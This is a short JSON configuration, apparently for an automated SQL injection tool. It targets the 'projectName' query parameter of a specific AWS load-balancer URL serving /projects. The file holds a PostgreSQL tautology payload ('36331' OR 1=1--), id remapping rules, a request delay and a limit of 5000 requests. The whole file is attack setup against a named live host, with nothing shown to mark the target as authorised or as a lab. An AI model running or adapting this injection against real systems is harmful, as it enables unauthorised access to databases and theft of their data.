{
  "base_url": "http://dune-load-balancer-1826856788.ap-southeast-2.elb.amazonaws.com/projects",
  "inject_mode": "query",
  "query_param": "projectName",
  "raw_payload": "36331' OR 1=1--",
  "sql_dialect": "postgresql",
  "id_remap": {
    "from": "36331",
    "to": "Demo_project"
  },
  "id_remap_legacy": [
    {
      "from": "Project 1",
      "to": "Demo_project"
    },
    {
      "from": "Project+1",
      "to": "Demo_project"
    }
  ],
  "sleep_seconds": 0.15,
  "max_requests": 5000,
  "extra_headers": {}
}